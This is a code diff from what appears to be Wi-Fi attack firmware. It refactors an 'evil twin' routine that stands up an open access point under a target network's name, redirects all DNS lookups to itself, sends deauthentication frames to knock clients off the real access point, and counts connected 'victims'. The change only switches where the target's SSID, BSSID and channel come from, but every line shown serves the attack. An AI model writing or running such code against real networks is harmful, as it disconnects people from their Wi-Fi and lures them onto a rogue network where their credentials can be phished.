@@ -125,7 +125,7 @@ void evilTwinLoop() {
 	// Web server + AP setup (runs once)
 	if (!webServerDone) {
 		WiFi.mode(WIFI_AP);
-		String useSsid = wifiSsid.length() > 0 ? wifiSsid : ssid;
+		String useSsid = wifiSsid.length() > 0 ? wifiSsid : Wifi::selected.ssid;
 		WiFi.softAP(useSsid.c_str(), ""); // open network with configured or target's SSID
 		WiFi.softAPConfig(EVIL_TWIN_GATEWAY, EVIL_TWIN_GATEWAY, EVIL_TWIN_SUBNET);
 		dnsServer.start(53, "*", EVIL_TWIN_GATEWAY);
@@ -163,7 +163,7 @@ void evilTwinLoop() {
 		isWebInterfaceEnabled = true;
 		evilTwinVictimCount = 0;
 
-		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : ssid);
+		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : Wifi::selected.ssid);
 		String lines[] = {
 			L->TXT_WIFI_EVIL_TWIN_RUNNING,
 			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
@@ -177,13 +177,13 @@ void evilTwinLoop() {
 	webServer.handleClient();
 
 	// Send deauth frames to the real AP
-	evilTwinSendDeauthFrame(bssid, channel);
+	evilTwinSendDeauthFrame(Wifi::selected.bssid, Wifi::selected.channel);
 
 	// Update victim counter
 	static int lastVictimCount = 0;
 	if (evilTwinVictimCount != lastVictimCount) {
 		lastVictimCount = evilTwinVictimCount;
-		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : ssid);
+		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : Wifi::selected.ssid);
 		String lines[] = {
 			L->TXT_WIFI_EVIL_TWIN_RUNNING,
 			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
